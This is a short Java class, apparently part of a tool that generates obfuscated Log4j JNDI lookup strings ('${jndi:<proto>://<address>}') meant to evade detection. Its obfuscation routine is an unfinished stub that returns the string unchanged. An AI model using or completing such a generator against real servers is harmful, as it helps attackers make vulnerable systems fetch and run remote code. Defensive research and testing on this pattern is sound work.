package org.yuudai;

import org.jetbrains.annotations.NotNull;

public class SearchStringObfuscator extends Obfuscator {
    static int max;
    static final String parts = "${*:-+}";

    static final char[] alphas = {'A', 'B'};

    public SearchStringObfuscator(int m) {
        max = m;
    }
    @Override
    public @NotNull String GenerateTargetString() {
        return jndi + ObfuscatorUtils.SelectRandom(proto) + "://" + address;
    }

    protected @NotNull String GenerateObfuscatedString() {
        return first + SearchStringObfuscation(GenerateTargetString(), max) + "}";
    }

    private @NotNull String SearchStringObfuscation(@NotNull String target, int m) {

        return target;
    }
}
